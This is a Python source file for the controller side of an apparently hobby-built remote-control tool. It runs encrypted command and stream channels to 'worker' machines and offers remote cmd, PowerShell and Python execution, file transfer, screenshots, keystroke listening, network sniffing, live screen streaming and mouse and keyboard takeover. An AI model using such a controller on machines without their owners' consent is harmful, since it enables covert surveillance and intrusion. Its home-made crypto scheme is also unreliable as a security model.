import os
import socket
import time
import tkinter
from typing import Callable
import struct
import hmac
import threading
import cv2
import numpy as np
import keyboard
import json
from rsa import rsa
import hashlib
from DHE.my_hmac import HMAC
from aes.aes_types import CTR
from Crypto.Cipher import AES
from Crypto.Util import Counter
Commend = Callable[[],bytes]
import mouse

def send_file(file_path:str,name:bytes) ->bytes:
    try:
        with open(file_path, "rb") as file:
            file_bytes = file.read()
        if name == b"" or b"." not in name:
            return "error: please enter a valid name".encode()
        return name+b":"+file_bytes
    except FileNotFoundError:
        return f"error: file '{file_path}' does not exist.".encode()
    except PermissionError:
        return f"error: file '{file_path}' is not accessible (permission issue).".encode()
    except Exception as e:
        return f"error: {e}".encode()


class Client:
    def __init__(self,command_sock:socket.socket,stream_sock:socket.socket,peer_master_key:bytes, master_key:bytes):
        self.command_sock = command_sock
        self.stream_sock = stream_sock
        self.master_key = master_key
        self.peer_master_key = peer_master_key



    def derive_own_keys(self):
        enc = hashlib.sha256(b"ENC" + self.master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.master_key).digest()
        return enc, mac

    def derive_peer_keys(self):
        enc = hashlib.sha256(b"ENC" + self.peer_master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.peer_master_key).digest()
        return enc, mac

    def close_client(self):
        self.command_sock.close()
        self.stream_sock.close()

class Master:
    def __init__(self, ip:str, port:int):
        self.server = socket.socket()
        self.server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.server.bind((ip,port))
        self.stream_server = socket.socket()
        self.stream_server.bind((ip,port+1))
        self.server.listen()
        self.stream_server.listen()
        self.functions: list[str] = ["cmd", "powershell", "python", "send_file", "receive_file", "screen_shot","listen_to_keys", "press_key_in_worker", "control_mouse", "sniff_from_worker", "live_stream"]
        self.exit:bool = False
        self.cur_ip = None
        self._sock_lock = threading.RLock()
        self.on_stream_stop = None
        self.streaming = False
        self.control_key = False
        self.control_mouse = False
        self.update_clients = None
        self.listen = False
        self.clients:dict[(str,int),Client] = {}
        private_key, public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
        self.rsa = rsa.RSA(my_public_key=public_key, my_private_key=private_key)


    def connect(self):
        while True:
            client, address = self.server.accept()
            with self._sock_lock:
                rsa_public_client = self.receiver(open_seal=False,sock=client)
            self.rsa.load_peer_public_key(rsa_public_client)
            with self._sock_lock:
                self.sender(self.rsa.dump_my_public_key(),seal=False, sock=client)
                client_aes_key_en =self.receiver(open_seal=False, sock=client)
            master_key = os.urandom(16).hex().encode()
            self.sender(self.rsa.send(master_key, hashlib.sha256(master_key).digest()), seal=False, sock=client)
            stream_client = self.stream_server.accept()[0]
            self.clients[address[0]] = Client(client,stream_client,self.rsa.receive(client_aes_key_en).encode(),master_key)
            self.update_clients()


    def login(self,username:str, password:str) -> str:
        self.sender(b"login:"+ username.encode() + b":" + password.encode())
        return self.receiver().decode()
    def recvall(self, sock: socket.socket, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return b""
            data += packet
        return data


    def receiver(self, stream: bool = False, open_seal: bool = True, sock:socket.socket = None, my_enc:bool = False) -> bytes:
        if sock:
            cur_sock = sock
            cur_client = None
        else:
            cur_client = self.clients[self.cur_ip]
            if stream:
                cur_sock = cur_client.stream_sock
            else:
                cur_sock = cur_client.command_sock

        size = self.recvall(cur_sock, 4)
        if not size:
            return b""
        size = struct.unpack("I", size)[0]
        if size <1+4+8+32:
            return b"error: Truncated message"
        blob = self.recvall(cur_sock,size)
        if open_seal:
            aes_key,mac_key = cur_client.derive_peer_keys()
            aad = blob[0:4]
            nonce = blob[4:12]
            tag = blob[-32:]
            c = blob[12:-32]
            header = aad + nonce
            to_mac =header + c
            if not my_enc:
                calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
            else:
                calc = HMAC("sha256",to_mac,mac_key,32)
            if not hmac.compare_digest(calc, tag):
                return b"error: Authentication failed"
            if not my_enc:
                ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
                return AES.new(aes_key, AES.MODE_CTR,counter=ctr).decrypt(c)
            else:
                ctr = CTR(aes_key,nonce)
                return ctr.decrypt(c)
        else:
            return blob


    def sender(self, message: bytes, stream: bool = False, seal: bool = True, sock: socket.socket = None, my_enc:bool = False):
        if sock:
            client_sock = sock
            cur_client = None
        else:
            cur_client = self.clients[self.cur_ip]
            if stream:
                client_sock = cur_client.stream_sock
            else:
                client_sock  = cur_client.command_sock
        if seal:
            aes_key, mac_key = cur_client.derive_own_keys()
            nonce = os.urandom(8)
            if not my_enc:
                ctr = Counter.new(128,initial_value=int.from_bytes(nonce))
                c = AES.new(aes_key, AES.MODE_CTR,counter=ctr).encrypt(message)
                header = struct.pack("I",len(message)) + nonce
                to_mac = header + c
                tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
            else:
                ctr = CTR(aes_key,nonce)
                c = ctr.encrypt(message)
                header = struct.pack("I", len(message)) + nonce
                to_mac = header + c
                tag = HMAC("sha256",to_mac,mac_key,32)
            data = struct.pack("I", len(header + c + tag)) + header + c + tag
        else:
            data = struct.pack("I", len(message)) + message
        client_sock.sendall(data)

    def control_mouse_on_worker(self):
        def send_payload(payload: dict):
            data = json.dumps(payload).encode()
            with self._sock_lock:
                self.sender(b"control_mouse:" + data)

        def listen(event):
            if not self.control_mouse:
                return
            if isinstance(event, mouse.ButtonEvent):
                payload = {"type": "button", "action": event.event_type, "button": str(event.button)}
                send_payload(payload)
                return
            if isinstance(event, mouse.WheelEvent):
                payload = {"type": "wheel", "delta": float(event.delta)}
                send_payload(payload)
                return
            else:
                if event.y<22 and self.streaming:
                    return
                payload = {"type": "move_abs", "x": event.x, "y": event.y-22}
                send_payload(payload)

        mouse.hook(listen)
        while True:
            time.sleep(1)


    def control_keys(self):
        while True:
            if self.control_key:
                event = keyboard.read_event()
                with self._sock_lock:
                    self.sender(b"press_key_in_worker:" + event.event_type.encode() + b":" + event.name.encode())

            else:
                time.sleep(0.1)




    def show_stream(self):
        root = tkinter.Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        root.destroy()
        while True:
            if self.streaming:
                self.sender(b"live_stream")
                frame_data = self.receiver(stream=True)
                if not frame_data:
                    time.sleep(0.05)
                    continue
                frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
                if frame is None:
                    time.sleep(0.005)
                    continue

                h, w, _ = frame.shape
                scale = min(screen_width / w, screen_height / h)
                new_w, new_h = int(w * scale), int(h * scale)
                resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
                canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
                x_offset = (screen_width - new_w) // 2
                y_offset = (screen_height - new_h) // 2
                canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized

                cv2.imshow("Live Stream", canvas)

                key = cv2.waitKey(1)

                if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
                    print("Window closed, stopping video loop...")
                    self.streaming = False
                    if self.on_stream_stop:
                        self.on_stream_stop()
                    continue

                if key == ord("q"):
                    print("Pressed 'q', stopping video loop...")
                    self.streaming = False
                    if self.on_stream_stop:
                        self.on_stream_stop()
                    continue
                time.sleep(0.001)

            else:
                try:
                    cv2.destroyWindow("Live Stream")
                except cv2.error:
                    pass
                time.sleep(0.1)





    def run2(self,function:str, message:bytes) -> bytes:
        if function == "quit":
            with self._sock_lock:
                self.sender("quit".encode())
            self.clients[self.cur_ip].close_client()
            del self.clients[self.cur_ip]
            self.update_clients()
            return "exited the worker".encode()
        if function == "send_file":
            splitted = message.decode().split(":")
            message = send_file(splitted[0],splitted[1].encode())
        if b"error:" in message:
            return message
        with self._sock_lock:
            self.sender(function.encode() + b":" + message)
            received = self.receiver()
        return received

